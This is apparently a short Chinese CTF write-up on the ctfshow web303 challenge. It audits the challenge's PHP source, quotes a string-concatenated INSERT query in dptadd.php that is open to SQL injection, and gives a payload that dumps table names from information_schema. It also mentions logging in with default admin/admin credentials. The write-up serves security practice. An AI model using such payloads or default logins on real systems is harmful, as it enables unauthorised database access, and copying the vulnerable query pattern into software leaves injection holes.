---
title: "[代码审计]实战篇:web303"
desc: TonyD0g
date: 2022-01-31 11:37:04
tags: 代码审计
---
<font size=4 >

###### [版本0x1] 
###### 2022-01-31

## 正文:
(请多多支持ctfshow,侵删)
源码下载:
https://ctfshow.lanzoui.com/i6wtkjg1gxa

## 白盒测试:

继续web302的思路,查看checklogin.php文件
发现无法注入:
![avatar](https://s4.ax1x.com/2022/01/31/HPXuSs.png)

翻了一下源文件,发现多了dptadd.php 和dpt.php文件
在dptadd.php中发现注入:
![avatar](https://s4.ax1x.com/2022/01/31/HPXETS.png)
```
$sql="insert into sds_dpt set sds_name='".$dpt_name."',sds_address ='".$dpt_address."',sds_build_date='".$dpt_build_year."',sds_have_safe_card='".$dpt_has_cert."',sds_safe_card_num='".$dpt_cert_number."',sds_telephone='".$dpt_telephone_number."';";
```


**Payload:**
查表:
```
dpt_name=1',sds_address =(select group_concat(table_name) from information_schema.tables where table_schema=database())%23
```

看了下dpt.php，没有什么特别的地方.


## 黑盒测试:
admin/admin 进入管理页面
![avatar](https://s4.ax1x.com/2022/01/31/HPXAw8.png)
![avatar](https://s4.ax1x.com/2022/01/31/HPXeYQ.png)
![avatar](https://s4.ax1x.com/2022/01/31/HPXiOP.png)




</font>